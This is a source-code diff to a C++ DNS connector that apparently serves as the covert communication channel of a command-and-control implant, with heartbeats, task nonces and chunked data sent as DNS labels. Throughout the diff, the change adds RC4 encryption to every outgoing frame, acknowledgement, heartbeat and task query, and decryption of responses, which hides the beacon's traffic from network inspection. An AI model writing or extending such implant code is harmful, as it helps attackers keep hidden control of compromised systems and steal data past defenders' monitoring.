@@ -502,6 +502,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             frame[metaSize + 7] = (BYTE)((offset >> 0) & 0xFF);
             memcpy(frame + headerSize, data + offset, chunk);
 
+            // RC4 encrypt the entire PUT frame before Base32 encoding
+            EncryptRC4(frame, frameSize, this->encryptKey, 16);
+
             memset(dataLabel, 0, sizeof(dataLabel));
             if (!DnsBuildDataLabels(frame, frameSize, this->labelSize, dataLabel, sizeof(dataLabel))) {
                 MemFreeLocal((LPVOID*)&frame, frameSize);
@@ -562,6 +565,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             ackData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
             ackData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
             ackData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
+            // RC4 encrypt ACK data before Base32 encoding
+            EncryptRC4(ackData, 12, this->encryptKey, 16);
             CHAR ackLabel[32]; // Increased for 12 bytes base32 encoded
             memset(ackLabel, 0, sizeof(ackLabel));
             DnsBase32Encode(ackData, 12, ackLabel, sizeof(ackLabel));
@@ -639,6 +644,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         hbData[9] = (BYTE)((this->downTaskNonce >> 16) & 0xFF);
         hbData[10] = (BYTE)((this->downTaskNonce >> 8) & 0xFF);
         hbData[11] = (BYTE)((this->downTaskNonce >> 0) & 0xFF);
+        // RC4 encrypt HB data before Base32 encoding
+        EncryptRC4(hbData, 12, this->encryptKey, 16);
         CHAR hbLabel[32]; // Increased size for 12 bytes base32 encoded
         memset(hbLabel, 0, sizeof(hbLabel));
         DnsBase32Encode(hbData, 12, hbLabel, sizeof(hbLabel));
@@ -683,7 +690,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     ULONG reqOffset = this->downFilled;
     ULONG nonce = GetTickCount() ^ (this->seq << 16) ^ (reqOffset * 31337);
     
-    // Pack: [offset:4][nonce:4] -> Base32 label
+    // Pack: [offset:4][nonce:4] -> RC4 encrypt -> Base32 label
     BYTE reqData[8];
     reqData[0] = (BYTE)((reqOffset >> 24) & 0xFF);
     reqData[1] = (BYTE)((reqOffset >> 16) & 0xFF);
@@ -693,6 +700,8 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     reqData[5] = (BYTE)((nonce >> 16) & 0xFF);
     reqData[6] = (BYTE)((nonce >> 8) & 0xFF);
     reqData[7] = (BYTE)((nonce >> 0) & 0xFF);
+    // RC4 encrypt GET query data
+    EncryptRC4(reqData, 8, this->encryptKey, 16);
     CHAR reqLabel[24];
     memset(reqLabel, 0, sizeof(reqLabel));
     DnsBase32Encode(reqData, 8, reqLabel, sizeof(reqLabel));
@@ -729,6 +738,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             }
             return;
         }
+
+        // RC4 decrypt the response after Base64 decoding
+        DecryptRC4(binBuf, binLen, this->encryptKey, 16);
 
         const ULONG headerSize = 8;
         // 新协议：带有 [total_len][offset] 头部
